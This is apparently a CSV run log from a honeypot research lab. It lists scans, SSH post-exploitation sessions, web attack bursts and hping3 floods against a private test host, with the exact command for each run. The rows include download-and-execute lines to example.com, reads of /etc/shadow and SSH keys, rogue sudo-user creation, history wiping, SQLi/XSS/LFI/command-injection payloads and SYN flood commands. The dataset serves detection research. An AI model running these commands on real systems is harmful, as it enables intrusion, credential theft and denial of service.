run_id,attack_type_label,tool,exact_command,target_ip,target_port,start_time_utc,end_time_utc,expected_honeypot,src_ip_seen,notes
S029,scan,nmap,nmap -Pn -sS -f --top-ports 100 -T4 192.168.32.138,192.168.32.138,top-100,2026-07-09T17:51:10Z,2026-07-09T17:51:22Z,p0f/honeytrap/suricata,192.168.32.1,fragmented SYN (evasion)
S030,scan,nmap,nmap -Pn -sS --scan-delay 150ms --top-ports 100 -T3 192.168.32.138,192.168.32.138,top-100,2026-07-09T17:51:47Z,2026-07-09T17:52:02Z,p0f/honeytrap/suricata,192.168.32.1,slow/stealth SYN
P001,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd,192.168.32.138,22,2026-07-10T22:25:21Z,2026-07-10T22:25:22Z,Cowrie,192.168.32.1,recon short | 5 cmds
P002,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; ifconfig ; ip a ; netstat -antp ; cat /etc/hosts ; w,192.168.32.138,22,2026-07-10T22:25:47Z,2026-07-10T22:25:47Z,Cowrie,192.168.32.1,recon + network enum | 10 cmds
P003,post_exploitation,ssh-session,whoami ; id ; sudo -l ; uname -r,192.168.32.138,22,2026-07-10T22:26:12Z,2026-07-10T22:26:13Z,Cowrie,192.168.32.1,privilege check | 4 cmds
P004,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; cat /etc/shadow ; ls -la /root ; cat /root/.ssh/authorized_keys ; crontab -l ; ps aux,192.168.32.138,22,2026-07-10T23:25:36Z,2026-07-10T23:25:37Z,Cowrie,192.168.32.1,recon + persistence look | 10 cmds
P005,post_exploitation,ssh-session,ifconfig ; ip a ; netstat -antp ; cat /etc/hosts ; w ; cat /proc/cpuinfo ; free -m ; df -h,192.168.32.138,22,2026-07-10T23:26:02Z,2026-07-10T23:26:02Z,Cowrie,192.168.32.1,system profiling | 8 cmds
P006,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; wget http://example.com/setup.sh ; chmod +x setup.sh ; ./setup.sh,192.168.32.138,22,2026-07-10T23:26:27Z,2026-07-10T23:26:27Z,Cowrie,192.168.32.1,recon + script download | 8 cmds
P007,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; curl -O http://example.com/miner ; chmod 777 miner ; ./miner &,192.168.32.138,22,2026-07-10T23:26:52Z,2026-07-10T23:26:53Z,Cowrie,192.168.32.1,recon + binary download | 8 cmds
P008,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; ifconfig ; ip a ; netstat -antp ; cat /etc/hosts ; w ; wget http://example.com/setup.sh ; chmod +x setup.sh ; ./setup.sh,192.168.32.138,22,2026-07-10T23:27:18Z,2026-07-10T23:27:18Z,Cowrie,192.168.32.1,full: enum + download | 13 cmds
P009,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; ifconfig ; ip a ; netstat -antp ; cat /etc/hosts ; w ; cat /etc/shadow ; ls -la /root ; cat /root/.ssh/authorized_keys ; crontab -l ; ps aux ; wget http://example.com/setup.sh ; chmod +x setup.sh ; ./setup.sh,192.168.32.138,22,2026-07-10T23:27:43Z,2026-07-10T23:27:44Z,Cowrie,192.168.32.1,long busy session + download | 18 cmds
P010,post_exploitation,ssh-session,ls ; pwd ; cd /tmp ; ls -la ; whoami,192.168.32.138,22,2026-07-10T23:28:09Z,2026-07-10T23:28:09Z,Cowrie,192.168.32.1,quick look /tmp | 5 cmds
P011,post_exploitation,ssh-session,cat /etc/os-release ; uname -a ; lscpu ; whoami,192.168.32.138,22,2026-07-10T23:28:34Z,2026-07-10T23:28:34Z,Cowrie,192.168.32.1,os fingerprint | 4 cmds
P012,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; passwd ; adduser hacker ; usermod -aG sudo hacker,192.168.32.138,22,2026-07-10T23:28:59Z,2026-07-10T23:29:00Z,Cowrie,192.168.32.1,add rogue user | 8 cmds
P013,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; iptables -L ; ufw status ; service ssh status,192.168.32.138,22,2026-07-10T23:29:25Z,2026-07-10T23:29:25Z,Cowrie,192.168.32.1,firewall/service check | 8 cmds
P014,post_exploitation,ssh-session,wget http://example.com/setup.sh ; chmod +x setup.sh ; ./setup.sh ; rm setup.sh ; history -c,192.168.32.138,22,2026-07-10T23:29:50Z,2026-07-10T23:29:51Z,Cowrie,192.168.32.1,download then clean tracks | 5 cmds
P015,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; find / -name '*.conf' 2>/dev/null ; ls -la /var/www,192.168.32.138,22,2026-07-10T23:30:16Z,2026-07-10T23:33:16Z,Cowrie,192.168.32.1,search configs (TIMEOUT) | 7 cmds
W001,web_attack,nikto,timeout -k 5 90 nikto -h http://192.168.32.138:80 -maxtime 75s -Tuning 123457 -nointeractive,192.168.32.138,80,2026-07-11T13:10:14Z,2026-07-11T13:11:44Z,Snare/Tanner,192.168.32.1,nikto vs tanner :80
W002,web_attack,nikto,timeout -k 5 90 nikto -h http://192.168.32.138:8080 -maxtime 75s -Tuning 123457 -nointeractive,192.168.32.138,8080,2026-07-11T13:12:09Z,2026-07-11T13:13:39Z,Wordpot,192.168.32.1,nikto vs wordpot :8080
W003,web_attack,nikto,timeout -k 5 90 nikto -h http://192.168.32.138:80 -maxtime 75s -Tuning 9 -nointeractive,192.168.32.138,80,2026-07-11T13:14:04Z,2026-07-11T13:15:34Z,Snare/Tanner,192.168.32.1,nikto vs tanner :80 (-Tuning 9 sqli/xss)
W004,web_attack,curl,"curl-burst :80 (6 reqs): /index.html?id=1' OR '1'='1 | /?id=1 UNION SELECT 1,2,3-- | /login?user=admin'-- ...",192.168.32.138,80,2026-07-11T14:39:18Z,2026-07-11T14:39:27Z,Snare/Tanner,192.168.32.1,sqli burst
W005,web_attack,curl,curl-burst :80 (4 reqs): /search?q=<script>alert(1)</script> | /?name=<img src=x onerror=alert(1)> | /comment?text=<svg/onload=alert(1)> ...,192.168.32.138,80,2026-07-11T14:39:52Z,2026-07-11T14:39:59Z,Snare/Tanner,192.168.32.1,xss burst
W006,web_attack,curl,curl-burst :80 (4 reqs): /?page=../../../../etc/passwd | /?file=../../../../etc/shadow | /index.php?page=....//....//etc/passwd ...,192.168.32.138,80,2026-07-11T14:40:24Z,2026-07-11T14:40:30Z,Snare/Tanner,192.168.32.1,lfi burst
W007,web_attack,curl,curl-burst :80 (3 reqs): /../../../../etc/passwd | /....//....//....//etc/hosts | /%2e%2e%2f%2e%2e%2fetc/passwd ...,192.168.32.138,80,2026-07-11T14:40:55Z,2026-07-11T14:40:59Z,Snare/Tanner,192.168.32.1,path traversal burst
W008,web_attack,curl,curl-burst :80 (3 reqs): /?cmd=;cat /etc/passwd | /?exec=|whoami | /ping?ip=127.0.0.1;id ...,192.168.32.138,80,2026-07-11T14:41:24Z,2026-07-11T14:41:29Z,Snare/Tanner,192.168.32.1,cmd-injection burst
W009,web_attack,curl,"curl-burst :80 (10 reqs): /index.html?id=1' OR '1'='1 | /?id=1 UNION SELECT 1,2,3-- | /login?user=admin'-- ...",192.168.32.138,80,2026-07-11T14:41:54Z,2026-07-11T14:42:09Z,Snare/Tanner,192.168.32.1,sqli+xss mixed
W010,web_attack,curl,curl-burst :80 (7 reqs): /?page=../../../../etc/passwd | /?file=../../../../etc/shadow | /index.php?page=....//....//etc/passwd ...,192.168.32.138,80,2026-07-11T14:42:34Z,2026-07-11T14:42:45Z,Snare/Tanner,192.168.32.1,lfi+traversal mixed
W011,web_attack,curl,"curl-burst :80 (12 reqs): /index.html?id=1' OR '1'='1 | /?id=1 UNION SELECT 1,2,3-- | /login?user=admin'-- ...",192.168.32.138,80,2026-07-11T14:43:10Z,2026-07-11T14:43:28Z,Snare/Tanner,192.168.32.1,sqli repeated (heavy)
W012,web_attack,curl,curl-burst :80 (8 reqs): /search?q=<script>alert(1)</script> | /?name=<img src=x onerror=alert(1)> | /comment?text=<svg/onload=alert(1)> ...,192.168.32.138,80,2026-07-11T14:43:53Z,2026-07-11T14:44:06Z,Snare/Tanner,192.168.32.1,xss repeated (heavy)
W013,web_attack,curl,"curl-burst :80 (14 reqs): /index.html?id=1' OR '1'='1 | /?id=1 UNION SELECT 1,2,3-- | /login?user=admin'-- ...",192.168.32.138,80,2026-07-11T14:44:31Z,2026-07-11T14:44:52Z,Snare/Tanner,192.168.32.1,multi-vector
W014,web_attack,curl,"curl-burst :80 (20 reqs): /index.html?id=1' OR '1'='1 | /?id=1 UNION SELECT 1,2,3-- | /login?user=admin'-- ...",192.168.32.138,80,2026-07-11T14:45:17Z,2026-07-11T14:45:49Z,Snare/Tanner,192.168.32.1,all-vectors big
W015,web_attack,curl,curl-burst :8080 (8 reqs): /wp-login.php | /xmlrpc.php | /wp-admin/ ...,192.168.32.138,8080,2026-07-11T14:46:14Z,2026-07-11T14:46:26Z,Wordpot,192.168.32.1,wordpress enum
W016,web_attack,curl,curl-burst :8080 (16 reqs): /wp-login.php | /xmlrpc.php | /wp-admin/ ...,192.168.32.138,8080,2026-07-11T14:46:51Z,2026-07-11T14:47:16Z,Wordpot,192.168.32.1,wordpress enum heavy
W017,web_attack,curl,curl-burst :8080 (14 reqs): /wp-login.php | /xmlrpc.php | /wp-admin/ ...,192.168.32.138,8080,2026-07-11T14:47:41Z,2026-07-11T14:48:02Z,Wordpot,192.168.32.1,wp enum + sqli
W018,web_attack,curl,"curl-burst :80 (6 reqs): /index.html?id=1' OR '1'='1 | /?id=1 UNION SELECT 1,2,3-- | /login?user=admin'-- ...",192.168.32.138,80,2026-07-11T14:48:27Z,2026-07-11T14:48:36Z,Snare/Tanner,192.168.32.1,sqli burst B
W019,web_attack,curl,curl-burst :80 (4 reqs): /search?q=<script>alert(1)</script> | /?name=<img src=x onerror=alert(1)> | /comment?text=<svg/onload=alert(1)> ...,192.168.32.138,80,2026-07-11T14:49:01Z,2026-07-11T14:49:07Z,Snare/Tanner,192.168.32.1,xss burst B
W020,web_attack,curl,curl-burst :80 (4 reqs): /?page=../../../../etc/passwd | /?file=../../../../etc/shadow | /index.php?page=....//....//etc/passwd ...,192.168.32.138,80,2026-07-11T14:49:32Z,2026-07-11T14:49:38Z,Snare/Tanner,192.168.32.1,lfi burst B
W021,web_attack,curl,"curl-burst :80 (10 reqs): /index.html?id=1' OR '1'='1 | /?id=1 UNION SELECT 1,2,3-- | /login?user=admin'-- ...",192.168.32.138,80,2026-07-11T14:50:03Z,2026-07-11T14:50:19Z,Snare/Tanner,192.168.32.1,mixed B
W022,web_attack,curl,curl-burst :80 (3 reqs): /?cmd=;cat /etc/passwd | /?exec=|whoami | /ping?ip=127.0.0.1;id ...,192.168.32.138,80,2026-07-11T14:50:44Z,2026-07-11T14:50:48Z,Snare/Tanner,192.168.32.1,cmd burst B
W023,web_attack,curl,curl-burst :80 (3 reqs): /../../../../etc/passwd | /....//....//....//etc/hosts | /%2e%2e%2f%2e%2e%2fetc/passwd ...,192.168.32.138,80,2026-07-11T14:51:13Z,2026-07-11T14:51:18Z,Snare/Tanner,192.168.32.1,traversal B
W024,web_attack,curl,"curl-burst :80 (14 reqs): /index.html?id=1' OR '1'='1 | /?id=1 UNION SELECT 1,2,3-- | /login?user=admin'-- ...",192.168.32.138,80,2026-07-11T14:51:43Z,2026-07-11T14:52:04Z,Snare/Tanner,192.168.32.1,multi B
W025,web_attack,curl,curl-burst :80 (8 reqs): /wp-login.php | /xmlrpc.php | /wp-admin/ ...,192.168.32.138,80,2026-07-11T14:52:29Z,2026-07-11T14:52:41Z,Snare/Tanner,192.168.32.1,wp-paths at tanner
W026,web_attack,curl,"curl-burst :80 (12 reqs): /index.html?id=1' OR '1'='1 | /?id=1 UNION SELECT 1,2,3-- | /login?user=admin'-- ...",192.168.32.138,80,2026-07-11T14:53:06Z,2026-07-11T14:53:25Z,Snare/Tanner,192.168.32.1,sqli heavy B
W027,web_attack,curl,curl-burst :80 (8 reqs): /search?q=<script>alert(1)</script> | /?name=<img src=x onerror=alert(1)> | /comment?text=<svg/onload=alert(1)> ...,192.168.32.138,80,2026-07-11T14:53:50Z,2026-07-11T14:54:02Z,Snare/Tanner,192.168.32.1,xss+lfi B
W028,web_attack,curl,"curl-burst :80 (17 reqs): /index.html?id=1' OR '1'='1 | /?id=1 UNION SELECT 1,2,3-- | /login?user=admin'-- ...",192.168.32.138,80,2026-07-11T14:54:27Z,2026-07-11T14:54:53Z,Snare/Tanner,192.168.32.1,four-vector B
W029,web_attack,curl,curl-burst :80 (8 reqs): /search?q=<script>alert(1)</script> | /?name=<img src=x onerror=alert(1)> | /comment?text=<svg/onload=alert(1)> ...,192.168.32.138,80,2026-07-11T14:55:18Z,2026-07-11T14:55:30Z,Snare/Tanner,192.168.32.1,xss heavy B
W030,web_attack,curl,"curl-burst :80 (9 reqs): /index.html?id=1' OR '1'='1 | /?id=1 UNION SELECT 1,2,3-- | /login?user=admin'-- ...",192.168.32.138,80,2026-07-11T14:55:55Z,2026-07-11T14:56:09Z,Snare/Tanner,192.168.32.1,sqli+cmd B
P016,post_exploitation,ssh-session,ifconfig ; ip a ; netstat -antp ; cat /etc/hosts ; w ; arp -a ; route -n ; cat /etc/resolv.conf,192.168.32.138,22,2026-07-22T13:48:56Z,2026-07-22T13:48:56Z,Cowrie,192.168.32.1,network map | 8 cmds
P017,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; curl -O http://example.com/miner ; chmod 777 miner ; ./miner & ; ps aux ; kill -9 1234,192.168.32.138,22,2026-07-22T13:49:21Z,2026-07-22T13:49:22Z,Cowrie,192.168.32.1,download + process mgmt | 10 cmds
P018,post_exploitation,ssh-session,echo test > /root/note.txt ; cat /root/note.txt ; ls -la /root,192.168.32.138,22,2026-07-22T13:49:47Z,2026-07-22T13:49:47Z,Cowrie,192.168.32.1,write file | 3 cmds
P019,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; cat /etc/shadow ; ls -la /root ; cat /root/.ssh/authorized_keys ; crontab -l ; ps aux ; curl -O http://example.com/miner ; chmod 777 miner ; ./miner &,192.168.32.138,22,2026-07-22T14:05:42Z,2026-07-22T14:05:43Z,Cowrie,192.168.32.1,persistence + binary | 13 cmds
P020,post_exploitation,ssh-session,wget http://example.com/a.sh ; wget http://example.com/b.sh ; chmod +x a.sh b.sh,192.168.32.138,22,2026-07-22T14:06:08Z,2026-07-22T14:06:08Z,Cowrie,192.168.32.1,multi download | 3 cmds
P021,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd,192.168.32.138,22,2026-07-22T14:06:33Z,2026-07-22T14:06:34Z,Cowrie,192.168.32.1,recon repeat A | 5 cmds
P022,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; ifconfig ; ip a ; netstat -antp ; cat /etc/hosts ; w,192.168.32.138,22,2026-07-22T14:06:59Z,2026-07-22T14:06:59Z,Cowrie,192.168.32.1,recon+net repeat | 10 cmds
P023,post_exploitation,ssh-session,whoami ; uname -a ; cat /etc/passwd ; wget http://example.com/x.sh ; ./x.sh,192.168.32.138,22,2026-07-22T14:07:24Z,2026-07-22T14:07:25Z,Cowrie,192.168.32.1,classic chain | 5 cmds
P024,post_exploitation,ssh-session,ifconfig ; ip a ; netstat -antp ; cat /etc/hosts ; w ; wget http://example.com/setup.sh ; chmod +x setup.sh ; ./setup.sh,192.168.32.138,22,2026-07-22T14:07:50Z,2026-07-22T14:07:50Z,Cowrie,192.168.32.1,net enum + download | 8 cmds
P025,post_exploitation,ssh-session,cat /etc/shadow ; ls -la /root ; cat /root/.ssh/authorized_keys ; crontab -l ; ps aux ; wget http://example.com/setup.sh ; chmod +x setup.sh ; ./setup.sh,192.168.32.138,22,2026-07-22T14:08:15Z,2026-07-22T14:08:15Z,Cowrie,192.168.32.1,persistence + download | 8 cmds
P026,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; top -n 1 ; vmstat ; iostat,192.168.32.138,22,2026-07-22T14:08:40Z,2026-07-22T14:08:41Z,Cowrie,192.168.32.1,resource peek | 8 cmds
P027,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; ifconfig ; ip a ; netstat -antp ; cat /etc/hosts ; w ; cat /etc/shadow ; ls -la /root ; cat /root/.ssh/authorized_keys ; crontab -l ; ps aux,192.168.32.138,22,2026-07-22T14:09:06Z,2026-07-22T14:09:06Z,Cowrie,192.168.32.1,full enum no download | 15 cmds
P028,post_exploitation,ssh-session,curl http://example.com/ ; wget http://example.com/y.tar.gz ; tar xzf y.tar.gz,192.168.32.138,22,2026-07-22T14:09:31Z,2026-07-22T14:09:32Z,Cowrie,192.168.32.1,fetch + extract | 3 cmds
P029,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; wget http://example.com/setup.sh ; chmod +x setup.sh ; ./setup.sh ; curl -O http://example.com/miner ; chmod 777 miner ; ./miner &,192.168.32.138,22,2026-07-22T14:09:57Z,2026-07-22T14:09:57Z,Cowrie,192.168.32.1,two downloads mixed | 11 cmds
P030,post_exploitation,ssh-session,whoami ; id ; uname -a ; hostname ; cat /etc/passwd ; ifconfig ; ip a ; netstat -antp ; cat /etc/hosts ; w ; wget http://example.com/setup.sh ; chmod +x setup.sh ; ./setup.sh ; history -c ; exit,192.168.32.138,22,2026-07-22T14:10:22Z,2026-07-22T14:10:22Z,Cowrie,192.168.32.1,full chain + exit | 15 cmds
D001,denial_of_service,hping3,hping3 -S -p 80 -i u200 -c 40000 192.168.32.138,192.168.32.138,80,2026-07-24T09:01:26Z,2026-07-24T09:04:17Z,Suricata/Snare,192.168.32.1,SYN flood :80 high-rate | flood+drain150s
D002,denial_of_service,hping3,hping3 -S -p 22 -i u500 -c 20000 192.168.32.138,192.168.32.138,22,2026-07-24T09:04:47Z,2026-07-24T09:07:30Z,Suricata/Cowrie,192.168.32.1,SYN flood :22 med-rate | flood+drain150s
D003,denial_of_service,hping3,hping3 -S -p 445 -i u500 -c 20000 192.168.32.138,192.168.32.138,445,2026-07-24T09:08:00Z,2026-07-24T09:10:43Z,Suricata/Dionaea,192.168.32.1,SYN flood :445 med-rate | flood+drain150s
D004,denial_of_service,hping3,hping3 -S -p 3306 -i u1000 -c 10000 192.168.32.138,192.168.32.138,3306,2026-07-24T09:16:46Z,2026-07-24T09:19:29Z,Suricata/Dionaea,192.168.32.1,SYN flood :3306 low-rate | flood+drain150s
D005,denial_of_service,hping3,hping3 -S -p 5555 -i u200 -c 40000 192.168.32.138,192.168.32.138,5555,2026-07-24T09:19:59Z,2026-07-24T09:22:48Z,Suricata/Honeytrap,192.168.32.1,SYN flood :5555 high-rate | flood+drain150s
D006,denial_of_service,hping3,hping3 -S -p 3389 -i u500 -c 20000 192.168.32.138,192.168.32.138,3389,2026-07-24T09:23:18Z,2026-07-24T09:26:01Z,Suricata/RDPhoneypot,192.168.32.1,SYN flood :3389 med-rate | flood+drain150s
D007,denial_of_service,hping3,hping3 -S -p 23 -i u500 -c 20000 192.168.32.138,192.168.32.138,23,2026-07-24T09:26:31Z,2026-07-24T09:29:14Z,Suricata/Cowrie,192.168.32.1,SYN flood :23 med-rate | flood+drain150s
D008,denial_of_service,hping3,hping3 -S -p 1433 -i u300 -c 30000 192.168.32.138,192.168.32.138,1433,2026-07-24T09:29:44Z,2026-07-24T09:32:29Z,Suricata/Dionaea,192.168.32.1,SYN flood :1433 high-rate | flood+drain150s
D009,denial_of_service,hping3,hping3 -S -p 8080 -i u500 -c 20000 192.168.32.138,192.168.32.138,8080,2026-07-24T09:32:59Z,2026-07-24T09:35:42Z,Suricata/Wordpot,192.168.32.1,SYN flood :8080 med-rate | flood+drain150s
D010,denial_of_service,hping3,hping3 -A -p 80 -i u300 -c 30000 192.168.32.138,192.168.32.138,80,2026-07-24T09:36:12Z,2026-07-24T09:38:56Z,Suricata,192.168.32.1,ACK flood :80 | flood+drain150s
D011,denial_of_service,hping3,hping3 -F -p 22 -i u500 -c 20000 192.168.32.138,192.168.32.138,22,2026-07-24T09:39:26Z,2026-07-24T09:42:09Z,Suricata,192.168.32.1,FIN flood :22 | flood+drain150s
